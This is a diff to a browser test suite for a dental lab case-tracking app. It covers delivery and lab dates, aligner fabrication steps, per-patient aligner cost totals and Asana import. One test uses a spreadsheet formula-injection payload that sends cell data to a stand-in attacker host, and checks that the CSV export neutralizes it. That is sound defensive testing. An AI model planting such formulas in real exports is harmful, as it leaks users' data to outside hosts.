@@ -49,7 +49,7 @@ async function newCase(p, o) {
   await p.click('.topBar [data-act=newCase]'); await p.waitForSelector('#ncForm');
   await p.click('#ncForm .tt[data-tile=' + o.type + ']'); await p.fill('#cf-patient', o.patient);
   if (o.instructions) await p.fill('#cf-instrOther', o.instructions);
-  if (o.due) await p.fill('#cf-dueDate', o.due);
+  if (o.delivery) await p.fill('#cf-deliveryDate', o.delivery);
   await p.click('#ncSave'); await p.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
 }
 async function openByName(p, name) {
@@ -169,10 +169,10 @@ async function openByName(p, name) {
   await owner.click('#drawer [data-act=closeDrawer] >> nth=0'); await gwen.click('#drawer [data-act=closeDrawer] >> nth=0');
 
   console.log('\n# Board: advance button and completing');
-  await newCase(gwen, { type: 'retainer', patient: P2, due: '2020-01-01' });
+  await newCase(gwen, { type: 'retainer', patient: P2, delivery: '2020-01-01' });
   await owner.click('#nav-board'); await owner.fill('#q', ''); await owner.click('[data-act=flow][data-k=retainer]');
   await owner.waitForSelector('.kc:has-text("' + P2 + '")', { timeout: 15000 });
-  check(await owner.isVisible('.kc:has-text("' + P2 + '") .due.over'), 'past due date shows as late');
+  check(await owner.isVisible('.kc:has-text("' + P2 + '") .due.over:has-text("Delivery")'), 'a past delivery date shows as late');
   await owner.click('#nav-today'); await owner.waitForSelector('.tile.red .n');
   check(Number(await owner.textContent('.tile.red .n')) >= 1, 'Today shows an overdue count');
   await owner.click('#nav-board');
@@ -389,7 +389,7 @@ async function openByName(p, name) {
   await owner.click('#ncForm .tt[data-tile=finishing]'); await owner.fill('#cf-patient', 'Fiona Finisher');
   check(await owner.inputValue('#cf-detail') === 'Finishing aligners', 'detail reads Finishing aligners');
   check(await owner.isVisible('#cf-titanUrl'), 'Titan link offered (in-house)');
-  check(await owner.inputValue('#cf-dueDate') === await owner.evaluate(() => addDays(todayISO(), 14)), 'aligner dates fill in');
+  check(await owner.inputValue('#cf-labDate') === await owner.evaluate(() => addDays(todayISO(), 21)) && await owner.inputValue('#cf-deliveryDate') === await owner.evaluate(() => addDays(todayISO(), 28)), 'aligner dates fill in (lab completion +21, delivery +28)');
   await owner.click('#cf-tc [data-tq=ant]');
   await owner.click('#cf-tc [data-tool=implant]'); await owner.click('#cf-tc .tooth[data-t=UL6]');
   await owner.click('#cf-tc [data-tool=noatt]'); await owner.click('#cf-tc .tooth[data-t=LL3]');
@@ -454,7 +454,7 @@ async function openByName(p, name) {
   check(!(await owner.isVisible('.pickRow[data-g=initial]')), 'no refinement question for a mouthguard');
   await owner.click('.pickRow[data-g=arches] .pick[data-v=Upper]');
   check(await owner.inputValue('#cf-detail') === 'Mouthguard (U)', 'detail reads Mouthguard (U)');
-  check(await owner.inputValue('#cf-dueDate') === await owner.evaluate(() => addClinicDays(todayISO(), 2)) && await owner.inputValue('#cf-deliveryDate') === await owner.evaluate(() => addClinicDays(todayISO(), 2)), 'due and delivered in two office days, like retainers');
+  check(await owner.inputValue('#cf-deliveryDate') === await owner.evaluate(() => addClinicDays(todayISO(), 2)), 'delivered in two office days, like retainers');
   check(await owner.inputValue('#cf-assignee') === await owner.evaluate(() => meSid()), 'assigned to whoever creates it');
   await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
   await owner.click('#nav-board'); await owner.fill('#q', ''); await owner.click('[data-act=flow][data-k=retainer]');
@@ -547,7 +547,7 @@ async function openByName(p, name) {
   check(await owner.isVisible('#ncForm .tt[data-tile=nla] .nlf'), 'In-house shows the NL mark');
   await owner.click('#ncForm .tt[data-tile=retainer]');
   await owner.fill('#cf-scanDate', '2026-10-07'); // a Wednesday
-  check(await owner.inputValue('#cf-dueDate') === '2026-10-12' && await owner.inputValue('#cf-deliveryDate') === '2026-10-12', 'retainers scanned on a Wednesday are due and delivered Monday (2 office days, Mon–Thu)');
+  check(await owner.inputValue('#cf-deliveryDate') === '2026-10-12' && await owner.inputValue('#cf-labDate') === '', 'retainers scanned on a Wednesday are delivered Monday (2 office days, Mon–Thu)');
   await owner.fill('#cf-scanDate', '2026-11-24'); // Tuesday of Thanksgiving week
   check(await owner.inputValue('#cf-deliveryDate') === '2026-12-01', 'office holidays are skipped (Thanksgiving week → Tuesday Dec 1)');
   await owner.click('#ncForm .tt[data-tile=models]'); await owner.fill('#cf-patient', 'Mona Modelson');
@@ -568,6 +568,55 @@ async function openByName(p, name) {
   check((await owner.getAttribute('#drawer .tt[data-tile=retreat]', 'aria-checked')) === 'true', 'and it still edits as Retreatment');
   await owner.click('#drawer [data-act=cancelEdit]'); await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
 
+  console.log('\n# No due date; in-house fabrication steps; progress marks; aligner totals per patient');
+  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
+  check((await owner.locator('#cf-dueDate').count()) === 0 && await owner.isVisible('#cf-scanDate') && await owner.isVisible('#cf-labDate') && await owner.isVisible('#cf-deliveryDate'), 'dates are scan, lab completion and delivery — no due date');
+  await owner.click('#ncForm .tt[data-tile=nla]'); await owner.fill('#cf-patient', 'Nadia Setcount'); await owner.fill('#cf-chart', '77-1234');
+  await owner.click('.pickRow[data-g=initial] .pick[data-v=yes]'); await owner.fill('#cf-alU', '20'); await owner.fill('#cf-alL', '20');
+  check(/40 aligners in this set/.test(await owner.textContent('#cf-alTotal')), 'aligners, not stages: upper 20 + lower 20 = 40 in this set');
+  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
+  await openByName(owner, 'Nadia Setcount');
+  check((await owner.locator('#drawer .stepGrp:has-text("In fabrication")').count()) === 1 && (await owner.locator('#drawer .step.sub').count()) === 7, 'the stepper shows the seven fabrication steps under In fabrication');
+  await owner.click('#drawer .step[data-k=fab]'); await owner.waitForSelector('#drawer .step.cur[data-k=fab]', { timeout: 15000 });
+  check(/40 aligners in this set \(U 20 · L 20\)/.test(await owner.textContent('#alBox')) && /Patient total: 40 aligners/.test(await owner.textContent('#alBox')), 'the case shows its 40 aligners (U 20 · L 20) and the patient total');
+  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
+  await owner.click('#nav-board'); await owner.fill('#q', ''); await owner.click('[data-act=flow][data-k=inhouse]');
+  const nCard = 'section[aria-label="In fabrication"] .kc:has-text("Nadia Setcount")';
+  await owner.waitForSelector(nCard + ' .kstep:has-text("Export STLs")', { timeout: 15000 });
+  check(/1 of 7/.test(await owner.textContent(nCard + ' .kstep')), 'board: one In fabrication column; the card shows Export STLs, 1 of 7');
+  await owner.click(nCard + ' .adv'); await owner.waitForSelector(nCard + ' .kstep:has-text("Send to printer")', { timeout: 15000 });
+  check(/2 of 7/.test(await owner.textContent(nCard + ' .kstep')) && (await owner.locator(nCard + ' .sprog i.d').count()) === 1, 'the arrow moves it one step (Send to printer, 2 of 7)');
+  await owner.click('#nav-list'); await owner.fill('#q', 'Nadia Setcount');
+  const nRow = 'tr.click:has-text("Nadia Setcount")'; await owner.waitForSelector(nRow + ' .sprog');
+  check((await owner.locator(nRow + ' .sprog i').count()) === 11 && (await owner.locator(nRow + ' .sprog .pg i').count()) === 7 && (await owner.locator(nRow + ' .sprog i.d').count()) === 3 && (await owner.locator(nRow + ' .sprog i.c').count()) === 1, 'list: a progress bar with every step marked (3 done, now on step 4 of 11)');
+  check(/Send to printer · in fabrication 2\/7/.test(await owner.textContent(nRow + ' td.stg')), 'list: says Send to printer, in fabrication 2/7');
+  await owner.click(nRow); await owner.waitForSelector('#drawer .stepper');
+  await owner.click('#drawer .dFt [data-act=complete]'); await owner.waitForSelector('#drawer', { state: 'hidden', timeout: 15000 }).catch(() => {});
+  await sleep(800);
+  await owner.click('#nav-admin'); await owner.fill('#alPer', '4.5'); await owner.press('#alPer', 'Tab');
+  await owner.waitForSelector('.toast:has-text("Saved")', { timeout: 15000 });
+  check(true, 'Dr. A sets the cost per aligner in Team & security');
+  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
+  await owner.click('#ncForm .tt[data-tile=nla]'); await owner.fill('#cf-patient', 'Nadia Setcount'); await owner.fill('#cf-chart', '77-1234');
+  await owner.click('.pickRow[data-g=initial] .pick[data-v=no]'); await owner.fill('#cf-alU', '12'); await owner.fill('#cf-alL', '10');
+  await owner.waitForSelector('#cf-alTotal:has-text("Patient total: 62 aligners")', { timeout: 20000 });
+  check(await owner.isVisible('#cf-alTotal .alSet:has-text("Initial 40")') && await owner.isVisible('#cf-alTotal .alSet.me:has-text("Refinement 1 22")'), 'New case adds the earlier set: Initial 40 + Refinement 1 22 = 62 aligners');
+  check(/est\. \$99\.00/.test(await owner.textContent('#cf-alTotal')) && /est\. \$279\.00/.test(await owner.textContent('#cf-alTotal')), 'estimated cost: this set 22 × $4.50 = $99.00; patient 62 × $4.50 = $279.00');
+  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
+  await owner.click('#nav-list'); await owner.fill('#q', 'Nadia Setcount'); await owner.waitForSelector('tr.click:has-text("Nadia Setcount") .alMini:has-text("62 total")', { timeout: 20000 });
+  check(/22 aligners/.test(await owner.textContent('tr.click:has-text("Nadia Setcount") .alMini')), 'list: 22 aligners · 62 total');
+  await owner.click('tr.click:has-text("Nadia Setcount")'); await owner.waitForSelector('#alBox');
+  check(/Patient total: 62 aligners/.test(await owner.textContent('#alBox')) && /Refinement 1/.test(await owner.textContent('#alBox')) && /est\. \$99\.00/.test(await owner.textContent('#alBox')), 'the refinement case shows its estimated cost and the patient’s total');
+  await owner.click('#drawer [data-act=closeDrawer] >> nth=0'); await owner.fill('#q', '');
+  check(await owner.evaluate(() => {
+    const S = (n, c) => ({ name: n, completed: c });
+    const a = stageFromSection('nla', 'In Fabrication', [S('Exported STLs U1-3', true), S('Sent to printer ', true), S('Printing COMPLETED ', false), S('Thermoforming', false), S('Trimming ', false), S('Polished ', false), S('Final Wash and Dry', false)]);
+    const b = stageFromSection('nla', 'In Fabrication', [S('Exported STLs', true), S('Sent to printer', true), S('Printing COMPLETED', true), S('Thermoforming', true), S('Trimming', true), S('Polished', true), S('Final Wash and Dry', false)]);
+    const c = stageFromSection('nla', 'In Fabrication', null);
+    const rows = asanaRowsFromCSV('Task ID,Name,Section/Column,Projects,Completed At,Parent task\n1,"Test Case - Aligners (In-House)",In Fabrication,NL Lab,,\n2,Exported STLs,,,2026-10-01,"Test Case - Aligners (In-House)"\n3,Sent to printer,,,,"Test Case - Aligners (In-House)"');
+    return a === 'print' && b === 'wash' && c === 'fab' && rows.length === 1 && caseFromAsana(rows[0], 'NL Lab', []).stage === 'send';
+  }), 'Asana import: the NL Lab checklist (subtasks) picks the fabrication step, from the API or a CSV');
+
   console.log('\n# Spreadsheet-formula text is neutralized in the export');
   await owner.fill('#q', ''); await newCase(owner, { type: 'models', patient: '=HYPERLINK("http://evil.example/?"&A1,"x")' });
 
@@ -578,6 +627,7 @@ async function openByName(p, name) {
   check(exp.includes(P1) && exp.includes(P2) && exp.includes('Imogen Fakeworth'), 'export includes open and completed cases');
   check(exp.includes('"\'=HYPERLINK(') && !/(^|,)"=HYPERLINK/m.test(exp), 'formula-looking text is exported as plain text');
   check(exp.includes('Digital enhancement 2 (DE2)') && exp.includes('Mouthguard (U)'), 'export carries DE and mouthguard details');
+  check(/Aligners in set/.test(exp.split('\n')[0]) && !/,"?Due"?,/.test(exp.split('\n')[0]), 'export has aligners per set and no due-date column');
 
   console.log('\n# Activity');
   await owner.click('#nav-admin'); await owner.click('[data-act=loadActivity]');
